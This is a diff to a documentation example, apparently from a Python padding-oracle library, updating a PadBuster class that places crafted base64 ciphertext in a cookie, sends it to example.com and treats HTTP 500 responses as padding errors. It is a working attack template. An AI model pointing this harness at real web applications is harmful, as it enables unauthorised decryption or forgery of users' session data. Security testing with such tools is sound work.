@@ -35,24 +35,28 @@ See below for an example (from `the example`_): ::
     class PadBuster(PaddingOracle):
         def __init__(self, **kwargs):
             super(PadBuster, self).__init__(**kwargs)
-            self.session = requests.session(prefetch=True, timeout=5, verify=False)
+            self.session = requests.Session()
+            self.wait = kwargs.get('wait', 2.0)
 
-        def oracle(self, data):
+        def oracle(self, data, **kwargs):
             somecookie = quote(b64encode(data))
             self.session.cookies['somecookie'] = somecookie
 
             while 1:
                 try:
-                    response = self.session.get('http://www.example.com/')
+                    response = self.session.get('http://www.example.com/',
+                            stream=False, timeout=5, verify=False)
                     break
-                except (socket.error, requests.exceptions.SSLError):
-                    time.sleep(2)
+                except (socket.error, requests.exceptions.RequestException):
+                    logging.exception('Retrying request in %.2f seconds...',
+                                      self.wait)
+                    time.sleep(self.wait)
                     continue
 
             self.history.append(response)
 
             if response.ok:
-                logging.debug('No padding exception raised on %r', cookie)
+                logging.debug('No padding exception raised on %r', somecookie)
                 return
 
             # An HTTP 500 error was returned, likely due to incorrect padding
